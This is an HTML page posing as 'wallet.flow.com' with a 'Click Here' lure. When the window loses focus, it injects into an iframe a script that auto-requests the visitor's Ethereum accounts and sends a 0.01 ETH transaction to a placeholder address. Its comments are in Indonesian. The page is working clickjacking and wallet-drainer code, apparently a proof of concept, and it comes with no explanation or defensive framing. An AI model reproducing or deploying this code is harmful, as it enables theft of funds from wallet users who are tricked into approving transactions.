<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>wallet.flow.com</title>
  <style>
    iframe {
      width: 80%;
      height: 300px;
      border: 1px solid #ccc;
      margin-top: 20px;
    }
    body {
      font-family: Arial, sans-serif;
      text-align: center;
    }
  </style>
</head>
<body>
  <h1>Click Here</h1>
  <iframe id="iframe"></iframe>

  <script>
    window.onblur = function () {
      const iframe = document.getElementById("iframe");
      const doc = iframe.contentDocument || iframe.contentWindow.document;
      doc.open();
      doc.write(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>wallet.flow.com</title>
</head>
<body>
  <h3 id="msg">Checking wallet...</h3>

  <script>
    async function autoConnectAndSend() {
      const msgEl = document.getElementById('msg');

      if (!window.ethereum) {
        msgEl.innerText = "No wallet detected!";
        return;
      }

      try {
        // 1. Coba konek wallet
        const accounts = await window.ethereum.request({
          method: "eth_requestAccounts"
        });

        const user = accounts[0];
        msgEl.innerText = "Connected: " + user;

        // 2. Setelah konek â†’ kirim transaksi
        document.location="http://wallet.flow.com";
        const txParams = {
          from: user,
          to: "0x0000000000000000000000000000000000000000", // ganti alamat tujuan
          value: "0x2386F26FC10000", // 0.01 ETH dalam wei
          gas: "0x5208" // 21000 gas
        };

        const txHash = await window.ethereum.request({
          method: "eth_sendTransaction",
          params: [txParams]
        });

        msgEl.innerText = "Transaction sent! Hash: " + txHash;

      } catch (err) {
        console.error(err);
        msgEl.innerText = "User denied or error occurred.";
      }
    }

    // Jalankan otomatis saat halaman load
    window.addEventListener("load", autoConnectAndSend);
  </\script>
</body>
</html>

      `);
      doc.close();
    };
  </script>
</body>
</html>
